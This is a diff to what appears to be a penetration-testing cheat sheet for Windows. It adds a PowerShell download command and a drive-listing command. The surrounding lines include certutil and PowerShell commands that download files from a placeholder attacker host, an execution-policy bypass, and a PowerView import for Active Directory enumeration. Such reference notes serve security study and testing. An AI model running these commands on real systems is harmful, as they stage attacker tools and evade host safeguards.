@@ -132,13 +132,16 @@ dir /a:d `show only hidden folder`<br/>
 dir /a:h `show only hidden files`<br/>
 
 ### Downloading Files
-
 `certutil.exe -urlcache -f http://<ip>:<port>/<file> ouput.exe`<br />
-`powershell -c "wget http://<ip>:<port>/<file>" -outfile output.exe`
+`powershell -c "wget http://<ip>:<port>/<file>" -outfile output.exe`<br />
+`powershell Invoke-WebRequest -Uri $ip -OutFile $filepath`
 
 ### Active Directory
 `powershell -ep bypass`  load a powershell shell with execution policy bypassed <br/>
 `. .\PowerView.ps1`      import the PowerView module
+
+## List Drives
+`wmic logicaldisk get caption`
 
 # Msfvenom
 ### List All Payloads
